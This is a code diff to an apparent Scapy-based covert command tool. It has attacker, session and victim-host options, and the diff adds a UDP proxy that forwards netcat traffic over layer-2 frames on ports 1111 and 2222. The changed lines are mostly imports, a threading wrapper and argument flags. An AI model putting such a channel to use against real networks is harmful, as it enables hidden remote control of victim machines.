@@ -5,6 +5,11 @@ from scapy.interfaces import get_working_ifaces
 import subprocess, os, socket, sys
 import platform
 
+from UDPProxy import start_udpproxy, stop_udpproxy # This import simply opens/closes some ports that are
+                                                   # used for UDP communication
+                                                   
+from UDPRelay import start_sniffing_args # This import is used to send / receive packets and frames.
+
 print("Current Scapy Interface:", conf.iface)
 os_name = platform.system()
 
@@ -402,6 +407,23 @@ def ControlPanel(userin):
                 
             userin = ""
 
+# Proxy ports
+def proxy(mode):
+    global session_id
+    global attacker_id
+    
+    #start_udpproxy()
+    proxy_thread = threading.Thread(target=start_udpproxy)
+    proxy_thread.start()
+    
+    start_sniffing_args(attacker_id, session_id, mode)
+    #proxy_thread2.start()
+    
+    #time.sleep(10) #wait 10 seconds
+    #print("debug")
+    #stop_udpproxy()
+    #proxy_thread.join()
+    
 # Sniff Ethernet frames and call the process_packet function for each packet
 def listen():
     print("In listen mode: ")
@@ -460,14 +482,18 @@ def main():
     parser.add_argument("-l", "--listen", action='store_true', help="Listen for connections")
     parser.add_argument("-c", "--connect", action='store_true', help="Connect and instruct commands")
     parser.add_argument("-m", "--mac", help="beacon mac address", type=str)
-    parser.add_argument("-s", "--session", help="session id", type=str, required=True)
-    parser.add_argument("-a", "--attacker", help="attacker id", type=str, required=True)
+    #parser.add_argument("-s", "--session", help="session id", type=str, required=True)
+    #parser.add_argument("-a", "--attacker", help="attacker id", type=str, required=True)
+    parser.add_argument("-s", "--session", help="session id", type=str, required=False)
+    parser.add_argument("-a", "--attacker", help="attacker id", type=str, required=False)
+    
     parser.add_argument("-d", "--delay", help="frame delay for chunked responses", type=int)
     parser.add_argument("-f", "--framesize", help="Sets frame size (victim host)", type=int)
+    parser.add_argument("-p", "--proxy", action='store_true', help="Proxy - UDP ports 1111, 2222")
     
     
     args = parser.parse_args()
-
+    
     if args.mac:
         mac_address = args.mac
         
@@ -482,6 +508,13 @@ def main():
     
     if args.session:
         session_id = args.session
+        
+    # This section is used for layer 2 port forwarding, currently for netcat
+    if args.proxy and args.listen:
+        proxy("listen")
+    
+    if args.proxy and args.connect:
+        proxy("connect")
     
     if args.listen:
         listen()
